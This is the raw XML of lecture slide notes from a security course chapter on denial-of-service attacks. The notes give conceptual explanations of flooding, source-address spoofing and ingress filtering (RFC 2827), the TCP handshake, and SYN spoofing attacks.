              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This chapter explores denial of service attacks, their definition, the various forms they take, and defenses against them. Denial of service is a form of attack on the availability of some service. In the context of computer and communications security, the focus is generally on network services that are attacked over their network connection. From this definition you can see that there are several categories of resources that could be attacked:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>network bandwidth - relates to the capacity of the network links connecting a server to the wider Internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>system resources - typically aims to overload or crash its network handling software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>application resources - aim to overload the capabilities of a server and limit its ability to respond to requests from other users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Originally only one, or a small number of source systemsdirectly under the attacker’s control, was used. This is all that is required to send the</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>packets needed for any attack targeting a bug in a server’s network handling code or some application. Attacks requiring high traffic volumes are more commonly sent from multiple systems at the same time, using distributed or amplified forms of DoS attacks.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="189511812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0494206C-CBBB-421B-95C4-72F751EC6017}"/>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BE0A35F4-F832-479B-BCD1-49E3A03D2CD6}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>152</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10243" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8875794-2B44-4821-8BE7-2B25F62705D9}"/>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CB04B473-82B9-429A-9217-9C29188C48F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>For example, in the network shown in Figure 8.1, the attacker might use the large company’s web server to target the medium sized company with a lower capacity network connection.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="362275717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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5926E4E-B025-4FA4-B9C2-9BE178B01F1D}"/>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3EFDB0B-485A-4E20-81BC-FB163A844A4F}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>155</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13315" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4CCC3B0-4282-4086-9D43-DB20D536D0D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13316" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B6E660F-887C-492A-A833-F03BBA9137AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>TCP/IP simply does not include the ability, by default, to ensure that the source address in a packet really does correspond with</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>that of the originating system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>It is possible to impose filtering on routers to ensure this (or at least that source network address is valid)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>However, this filtering3 needs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>to be imposed as close to the originating system as possible, where the knowledge</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>of valid source addresses is as accurate as possible. In general, this should occur at</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>the point where an organization’s network connects to the wider Internet, at the</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>borders of the ISP’s providing this connection. Despite this being a long-standing</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>security recommendation to combat problems such as DoS attacks, for example</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>(RFC 2827), many ISPs do not implement such filtering. As a consequence, attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>using spoofed-source packets continue to occur frequently</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1200" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="96125962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95D186CE-99A9-4CA2-8838-A274902A812F}"/>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529BC86C-9A93-4C05-822B-C3186ACB108E}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>156</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16387" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4477FB77-C3E3-4BCD-BE31-6C73CD25BB02}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16388" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EA86F46-19E2-4A70-88FC-18AEBF47D8A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Along with the basic flooding attack, the other common classic denial of service attack is the SYN spoofing attack. This attacks the ability of a network server to respond to TCP connection requests by overflowing the tables used to manage such connections. This means future connection requests from legitimate users fail, denying them access to the server. It is thus an attack on system resources, specifically the network handling code in the operating system.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23134459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12093540-D47B-43BD-8728-66C71AF5C3FE}"/>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92B72D9-0D94-4A1E-9288-99E4E5939370}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>157</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18435" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4826984E-A59A-4C0D-AF56-05B99BD715D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18436" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A421EB8-AD14-4D55-8B39-DDB82C885ECF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>To understand the operation of these attacks we need to review the 3-way handshake that TCP uses to establish a connection. This is illustrated in Figure 8.2. The client system initiates the request for a TCP connection by sending a SYN packet to the server. This identifies the client’s address and port number, and supplies an initial sequence number. The server records all the details about this request in a table of known TCP connections. It then responds to the client with a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SYN-ACK (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>SYNchronize and ACKnowledge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> packet. This includes a sequence number for the server, and increments the client’s sequence number to confirm receipt of the SYN packet. Once the client receives this it sends an ACK packet to the server with an incremented server sequence number, and marks the connection as established. Likewise, when the server receives this ACK packet it also marks the connection as established. Either party may then proceed with data transfer. In practice, this ideal exchange sometimes fails. These packets are transported using IP, which is an unreliable, though best-effort, network protocol. Any of the packets might be lost in transit, as a result of congestion for example. Hence both the client and server keep track of which packets they have sent, and if no response is received in a reasonable time, will resend those packets. As a result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TCP (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Transmission Control Protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>) is a reliable transport protocol, and any applications using it need not concern themselves with problems of lost or reordered packets. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18718715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AEBFB656-EEB6-4B77-89C7-58309FE37E7F}"/>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6A714E68-65F3-490A-8138-8615BD071E23}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>158</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20483" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C1EACC7-A8C9-4EF7-BDB0-94B16BC517AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1" noChangeArrowheads="1" noTextEdit="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20484" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9FFDBA0-49A7-4182-9856-63B83DC5640B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A SYN spoofing attack exploits this behavior on the targeted server system. The attacker generates a number of SYN connection request packets with forged source addresses. For each of these the server records the details of the TCP connection request, and sends the SYN-ACK packet to the claimed source address, as shown in Figure 8.3. The server will resend the SYN-ACK packet a number of times before finally assuming the connection request has failed, and deleting the information saved concerning it. This table is typically sized on the assumption that most connection requests quickly succeed, and that a reasonable number of requests may be handled simultaneously. However in a SYN spoofing attack, the attacker directs a very large number of forged connection requests at the targeted server. These rapidly fill the table of known TCP connections on the server. Once this table is full, any future requests, including legitimate requests from other users, are rejected. The table entries will time out and be removed, which in normal network usage, corrects temporary overflow problems. However, if the attacker keeps a sufficient volume of forged requests flowing, this table will be constantly full and the server will be effectively cutoff from the Internet, unable to respond to most legitimate connection requests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Times" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176811743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id="{9F8242C0-70C2-4D97-B2B8-03B8909851A8}"/>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5901129-2E3C-42AA-B5F7-86D47D1FBF4C}" type="slidenum">
              <a:rPr lang="en-AU" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>159</a:t>
            </a:fld>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
